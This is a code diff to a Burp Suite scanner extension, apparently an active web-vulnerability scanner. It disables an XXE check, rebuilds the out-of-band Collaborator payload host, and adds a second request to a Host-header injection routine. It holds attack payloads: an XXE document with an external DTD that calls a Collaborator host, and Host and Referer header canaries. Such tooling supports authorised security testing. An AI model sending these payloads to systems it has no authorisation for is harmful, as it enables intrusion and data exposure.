@@ -1,4 +1,5 @@
 package burp;
+import burp.api.montoya.http.RequestOptions;
 import burp.api.montoya.http.message.params.HttpParameter;
 import burp.api.montoya.http.message.params.HttpParameterType;
 import burp.api.montoya.http.message.requests.HttpRequest;
@@ -23,7 +24,7 @@ public class PerRequestScans extends ParamScan {
                 this::doStrutsScan,
                 this::doStruts20179805Scan,
                 this::doStruts201811776Scan,
-                this::doXXEPostScan,
+                //this::doXXEPostScan, // dodgy check
                 this::doRailsScan
         );
     }
@@ -251,8 +252,7 @@ public class PerRequestScans extends ParamScan {
         }
 
         IBurpCollaboratorClientContext collab = Utilities.callbacks.createBurpCollaboratorClientContext();
-        String collabPayload = collab.generatePayload(true);
-
+        String collabPayload = collab.generatePayload(false) + "&#46;" + collab.getCollaboratorServerLocation();
         String xxePayload = "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE data SYSTEM \"http://" + collabPayload + "/scanner.dtd\"><data>&all;</data>";
 
         byte[] req = OldUtilities.setHeader(basePair.getRequest(), "Content-Type", "text/xml", true);
@@ -400,7 +400,8 @@ public class PerRequestScans extends ParamScan {
         String payloadHost = hostCanary + realHost;
 
         HttpRequest attackBase = original.withHeader("Referer", "https://"+payloadHost+"/"+refererCanary).withHeader("Cache-Control", "no-cache").withParameter(HttpParameter.parameter("cachebust", Utilities.randomString(6), HttpParameterType.URL));
-        MontoyaRequestResponse basicHostAttack = Scan.request(attackBase.withHeader("Host", payloadHost), true);;
+        MontoyaRequestResponse basicHostAttack = Scan.request(attackBase.withHeader("Host", payloadHost), true);
+        Scan.request(attackBase.withHeader("Host", payloadHost), true, true);
         if (basicHostAttack.status() == expectedStatus) {
             // DNS rebinding doesn't work on HTTPS
             if (!basicHostAttack.httpService().secure()) {
